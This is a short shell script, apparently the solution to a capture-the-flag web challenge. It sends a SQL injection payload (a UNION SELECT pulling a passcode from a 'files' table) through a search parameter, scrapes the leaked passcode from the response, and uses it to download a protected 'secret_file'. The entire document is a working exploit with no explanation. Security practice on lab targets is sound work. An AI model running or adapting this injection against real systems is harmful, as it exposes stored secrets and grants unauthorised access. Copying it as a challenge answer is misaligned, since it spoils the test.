PASSCODE=$(curl -s "http://${CHALLENGE_HOST}:${CHALLENGE_PORT}/?search=tajofieaura%27%29+UNION+SELECT+passcode+FROM+files+where+name%3D%27secret_file%27+--+" | grep -oP '(?<=li>).+(?=<form)')
curl -s "http://${CHALLENGE_HOST}:${CHALLENGE_PORT}/?download=secret_file&passcode=${PASSCODE}"
